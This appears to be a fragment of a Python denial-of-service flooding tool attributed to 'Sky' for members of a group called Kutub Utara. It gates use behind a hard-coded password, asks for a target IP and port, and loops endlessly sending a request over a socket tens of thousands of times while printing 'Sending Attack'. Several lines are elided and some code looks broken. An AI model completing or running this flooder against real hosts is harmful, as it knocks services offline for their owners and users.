...
import sys
os.system("color 5")
os.system(f"title Create By Sky")
Sky = "Sky"

for i in range(3):
    pwd = input("[Sky] Password Require: ")
    j = 3
    if (pwd == Sky):
        print("[Sky] Checking Password [Sky]\n")
        break
    else:
        time.sleep(5)
        print("[Sky] Invalid Password [Sky]\n")
        continue
time.sleep(2)
print("[Sky] Welcome To Tools Kutub Utara [Sky]")
time.sleep(2)
...
print("|=====================================|")
print("Tools For Member Kutub Utara")
print("|=====================================|")
print("Credit : Sky")
print("|=====================================|")

print()
ip = str(input("[Sky] Input IP Target: "))
port = int(input("[Sky] Port Target: "))
...
def tcpping(ip,port):
    try:
        ...
        print(f"[Sky] Connection {ip} on {port} its up!!!")
        time.sleep(3)
    except:
        print(f"[Sky] Connection {ip} on {port} its down!!!")
        time.sleep(3)
    ...
    while True:
        try:
            ...
            for x in range(60000):
                ...
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
            print(i +"[Sky] Sending Attack [Sky]")
        except socket.error:
            s.close()
            print("[Sky] Attack LOGS",ip,":",port,"[Sky]")
